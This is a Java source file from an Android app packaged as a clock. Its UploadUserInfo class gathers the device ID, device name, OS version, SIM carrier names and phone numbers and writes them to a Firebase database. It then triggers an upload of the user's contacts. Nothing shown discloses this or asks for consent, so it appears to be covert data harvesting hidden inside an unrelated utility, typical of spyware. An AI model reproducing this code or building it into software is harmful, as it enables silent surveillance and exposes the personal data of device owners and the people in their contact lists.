package com.aftab.clock.Classes;

import android.content.Context;
import android.os.Build;

import com.aftab.clock.Model.DeviceInfo;
import com.aftab.clock.Model.SimInfo;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.FireRef;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;

import java.util.ArrayList;
import java.util.List;

public class UploadUserInfo {

    private static UploadUserInfo instances;

    public static UploadUserInfo with(Context context) {

        SharedPref sh = new SharedPref(context);

        String deviceId = Functions.getDeviceId(context);
        String deviceName = Functions.getDeviceName();

        sh.putString(Constants.DEVICE_ID, deviceId);

        List<SimInfo> simInfoList = new ArrayList<>();
        simInfoList = Functions.getSimInfo(context);

        if (simInfoList.size() > 0) {
            if (simInfoList.size() == 1) {

                SimInfo simInfo = new SimInfo("", "", "");
                simInfoList.add(simInfo);

            }
        } else {

            SimInfo simInfo1 = new SimInfo("", "", "");
            SimInfo simInfo2 = new SimInfo("", "", "");
            simInfoList.add(simInfo1);
            simInfoList.add(simInfo2);

        }

        int version = Build.VERSION.SDK_INT;

        DeviceInfo deviceInfo = new DeviceInfo(deviceId, deviceName,""+version, simInfoList.get(0)
                .getCarrierName(), simInfoList.get(1).getCarrierName(), simInfoList.get(0)
                .getPhoneNumber(), simInfoList.get(1).getPhoneNumber(), "", "", "");


        FireRef.DEVICES.child(deviceId)
                .setValue(deviceInfo)
        .addOnCompleteListener(task -> {

            UploadContacts.with(context);

        });


        if (instances == null)
            instances = new UploadUserInfo();
        return instances;
    }


}
